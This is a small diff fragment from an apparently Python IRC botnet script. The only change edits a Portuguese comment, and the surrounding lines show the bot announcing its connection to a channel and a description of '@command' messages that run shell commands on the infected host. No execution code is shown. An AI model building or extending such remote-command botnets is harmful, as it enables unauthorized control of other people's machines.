@@ -40,7 +40,7 @@ while teste != True:
         teste = True
         s.send('PRIVMSG %s : Conectado com sucesso!\r\n' %canal)
 
-# Verifica o que é digitado no canal        
+# Verifica o que é digitado no canal do irc       
 # Se for digitado "@command + comando", o programa executa o comando informado no 
 # servidor que está rodando o botnet
 # EXEMPLO: @command clear
